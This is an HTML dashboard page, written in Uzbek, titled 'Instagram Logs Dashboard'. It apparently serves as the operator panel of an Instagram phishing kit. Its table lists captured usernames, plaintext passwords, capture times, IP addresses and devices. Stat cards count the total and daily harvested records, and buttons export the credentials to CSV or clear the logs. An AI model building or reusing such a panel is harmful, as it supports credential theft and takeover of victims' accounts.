<!DOCTYPE html>
<html lang="uz">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Instagram Logs</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0f172a;
            color: #f1f5f9;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding: 20px;
            background: #1e293b;
            border-radius: 12px;
            flex-wrap: wrap;
        }

        .logo {
            display: flex;
            align-items: center;
            font-size: 24px;
            color: #3b82f6;
        }

        .logo i {
            margin-right: 10px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: #1e293b;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
        }

        .stat-card h3 {
            color: #94a3b8;
            font-size: 14px;
        }

        .stat-card p {
            font-size: 32px;
            font-weight: bold;
            color: #60a5fa;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: #1e293b;
            border-radius: 12px;
            overflow: hidden;
        }

        th,
        td {
            padding: 16px;
            text-align: left;
            border-bottom: 1px solid #334155;
        }

        th {
            background: #0f172a;
            color: #60a5fa;
        }

        tr:hover {
            background: #334155;
        }

        .password-cell {
            font-family: monospace;
            color: #fbbf24;
        }

        .actions {
            margin-top: 30px;
            display: flex;
            gap: 15px;
        }

        .btn {
            padding: 10px 20px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
        }

        .btn:hover {
            background: #2563eb;
        }

        @media (max-width: 768px) {
            .stats {
                grid-template-columns: 1fr;
            }

            table {
                font-size: 14px;
                display: block;
                overflow-x: auto;
            }

            .header {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
        }

        @media (max-width: 480px) {

    .stats {
        grid-template-columns: repeat(4, 1fr); /* ðŸ”¥ 1 qatorda 4 ta */
        gap: 8px;
    }

    .stat-card {
        padding: 8px;
    }

    .stat-card h3 {
        font-size: 10px;
    }

    .stat-card p {
        font-size: 16px;
    }
}

    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fas fa-shield-alt"></i> Instagram Logs Dashboard
            </div>
            <div>
                <span id="backendStatus"></span> |
                Soniya: <span id="updateTime">0</span>
                <button onclick="location.reload()" style="margin-left: 15px;" class="btn">
                    <i class="fas fa-sync-alt"></i> Yangilash
                </button>
            </div>
        </div>
        <div class="stats">
            <div class="stat-card">
                <h3>Jami yozuvlar</h3>
                <p id="totalRecords">0</p>
            </div>
            <div class="stat-card">
                <h3>Bugungi</h3>
                <p id="todayRecords">0</p>
            </div>
            <div class="stat-card">
                <h3>Oxirgi kirish</h3>
                <p id="lastRecord">-</p>
            </div>
            <div class="stat-card">
                <h3>Server vaqti</h3>
                <p id="serverTime">-</p>
            </div>
        </div>

        <div class="actions">
            <button class="btn" onclick="exportCSV()">
                <i class="fas fa-download"></i> CSV yuklab olish
            </button>
            <button class="btn" onclick="clearLogs()" style="background: #ef4444;">
                <i class="fas fa-trash"></i> Barchasini o'chirish
            </button>
        </div>

        <table id="logsTable">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Vaqt</th>
                    <th>IP manzil</th>
                    <th>Qurilma</th>
                </tr>
            </thead>
            <tbody id="logsBody">
                <!-- Ma'lumotlar JS orqali to'ldiriladi -->
            </tbody>
        </table>
    </div>

    <script src="dashboard.js"></script>
</body>

</html>
